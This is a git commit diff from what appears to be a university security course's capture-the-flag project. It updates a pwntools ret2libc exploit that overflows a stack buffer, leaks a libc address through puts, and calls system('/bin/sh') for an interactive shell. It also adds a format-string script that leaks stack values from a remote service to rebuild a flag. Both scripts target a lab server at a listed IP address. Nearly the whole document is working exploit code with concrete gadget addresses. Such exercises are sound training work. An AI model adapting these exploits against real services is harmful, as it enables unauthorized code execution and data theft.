95de7725ac816d4f657ea06eb70f22d3ecf8e70b
yydderf <qazwsx900902@gmail.com>
2024-06-11 08:49:01 +0000

    feat: 2-1

--- project_4/solutions/1-3/ret2libc.py
+++ project_4/solutions/1-3/ret2libc.py
@@ -12,16 +12,15 @@ LOCAL_BIN = "../../source/ret2libc/ret2libc"
 LIBC = "/lib/x86_64-linux-gnu/libc.so.6"
 
 libc_elf = ELF(LIBC)
-libc_elf.address = 0x00007ffff7d89000
 
 if LOCAL:
     proc = process(LOCAL_BIN)
-    ELF_LOADED = ELF(LOCAL_BIN)
-    ROP_LOADED = ROP(ELF_LOADED)
+    elf = ELF(LOCAL_BIN)
+    ROP_LOADED = ROP(elf)
 elif REMOTETCP:
     proc = remote("140.113.24.241", 30173)
-    ELF_LOADED = ELF(LOCAL_BIN)
-    ROP_LOADED = ROP(ELF_LOADED)
+    elf = ELF(LOCAL_BIN)
+    ROP_LOADED = ROP(elf)
 
 if GDB and LOCAL:
     context.terminal = ['tmux', 'splitw', '-h']
@@ -31,16 +30,62 @@ if GDB and LOCAL:
 ###   PAYLOAD  ####
 ###################
 
+# 0x000000000040115d: pop rbp; ret;
 # 0x00007ffff7db33e5: pop rdi; ret;
-pop_rdi = 0x00007ffff7db33e5
+# pop_rbp = 0x000000000040115d 
 
-payload = b''
-payload += b'X' * (128 + 8)
-payload += pwnlib.util.packing.p64(pop_rdi)
-payload += pwnlib.util.packing.p64(next(libc_elf.search(b'/bin/sh\x00')))
-payload += pwnlib.util.packing.p64(libc_elf.symbols.system)
+RET = 0x40115e
+# POP_RDI = 0x00007ffff7db33e5
+POP_RDI = 0x00007feb4facd3e5
+PUTS_GOT = elf.got["puts"]
+PUTS_PLT = elf.plt["puts"]
+MAIN_SYM = elf.symbols["main"]
 
+log.info("puts got @ " + hex(PUTS_GOT))
+log.info("puts plt @ " + hex(PUTS_PLT))
+log.info("main sym @ " + hex(MAIN_SYM))
+
+payload = b"".join([
+    b"X" * (128 + 8),
+    p64(POP_RDI),
+    p64(PUTS_GOT),
+    p64(PUTS_PLT),
+    p64(MAIN_SYM),
+])
 
 print(proc.recvuntil(b"Welcome to the server!\n").decode())
+proc.send(payload)
+recv = proc.recvline().strip()
+leak = unpack(recv, 'all', endian='big')
+log.info(leak)
+libc_elf.address = leak - libc_elf.symbols["puts"]
+log.info(leak)
+log.info(libc_elf.symbols["puts"])
+log.info("libc   @ " + hex(libc_elf.address))
+
+PARAM_ADDR = next(libc_elf.search(b"/bin/sh\x00"))
+SYSTEM_ADDR = libc_elf.symbols["system"]
+EXIT_ADDR = libc_elf.symbols["exit"]
+
+log.info("/bin/sh @ " + hex(PARAM_ADDR))
+log.info("system  @ " + hex(SYSTEM_ADDR))
+log.info("exit    @ " + hex(EXIT_ADDR))
+
+payload = b"".join([
+    b"X" * (128 + 8),
+    p64(POP_RDI),
+    p64(PARAM_ADDR),
+    p64(SYSTEM_ADDR),
+    p64(EXIT_ADDR),
+])
+
+proc.clean()
 proc.sendline(payload)
 proc.interactive()
+
+# payload = b''
+# payload += b'X' * (128 + 8)
+# payload += pwnlib.util.packing.p64(ret)
+# payload += pwnlib.util.packing.p64(pop_rdi)
+# payload += pwnlib.util.packing.p64(next(libc_elf.search(b'/bin/sh\x00')))
+# payload += pwnlib.util.packing.p64(libc_elf.symbols.system)
---
+++ project_4/solutions/2-1/sol.py
@@ -0,0 +1,33 @@
+from pwn import *
+
+###################
+### CONNECTION ####
+###################
+LOCAL = True
+REMOTETCP = False
+GDB = True
+USE_ONE_GADGET = False
+
+LOCAL_BIN = "../../source/fmt/fmt"
+
+###################
+###   PAYLOAD  ####
+###################
+payload = "%{}$p"
+flag = ""
+
+for i in range(10, 15):
+    # proc = process(LOCAL_BIN)
+    proc = remote("140.113.24.241", 30172)
+
+    proc.sendline(payload.format(i).encode())
+
+    output = proc.recv(20)
+    tmp = ""
+    for i in range(2, len(output), 2):
+        tmp += chr(int(output[i:i+2].decode(), 16))
+    flag += tmp[::-1]
+
+    proc.close()
+
+print(flag)
